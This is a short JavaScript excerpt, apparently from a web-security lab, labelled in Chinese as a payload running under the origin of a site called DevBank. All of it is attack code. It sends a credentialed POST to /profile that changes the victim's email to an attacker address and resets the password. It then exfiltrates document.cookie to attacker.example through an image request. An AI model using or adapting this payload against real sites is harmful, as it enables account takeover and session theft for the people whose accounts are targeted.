// payload.js（节选）— 以 DevBank 源身份运行
var body = new URLSearchParams();
body.append('email', 'attacker@evil.example');
body.append('password', 'pwned-by-csrf');
fetch('/profile', { method:'POST', credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body: body.toString() })
  .then(function(){ new Image().src =
     'https://attacker.example/collect?c=' + encodeURIComponent(document.cookie); });
